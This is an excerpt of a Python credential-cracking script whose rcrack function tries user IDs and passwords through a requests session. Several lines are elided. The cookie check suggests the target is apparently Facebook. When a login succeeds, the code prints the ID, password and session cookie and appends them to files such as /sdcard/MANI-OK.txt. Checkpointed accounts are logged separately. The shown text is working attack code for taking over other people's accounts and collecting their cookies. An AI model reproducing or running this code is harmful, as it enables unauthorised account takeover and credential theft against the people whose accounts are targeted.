...
def rcrack(uid,pwx,tl):
	...
	#		print(idf+'|'+ps)
			...
			sys.stdout.write(f'\r\033[1;37m [M•A•N•I] %s<~>\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[USMAN-OK] '+idf+' √ '+ps+'\033[0;97m')
				print('%s[%sCOOKIE%s] : %s%s ' % (W,Y,W,G,cek_apk(coki)))
				open('/sdcard/MANI-OK.txt', 'a').write(idf+' √ '+ps+'\n')
				oks.append(idf)
				break
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[USMAN-CP] '+idf+' • '+ps+'\033[0;97m')
				open('/sdcard/MANI-CP.txt', 'a').write(idf+' • '+ps+'\n')
				cps.append(idf)
				break
			else:
				continue
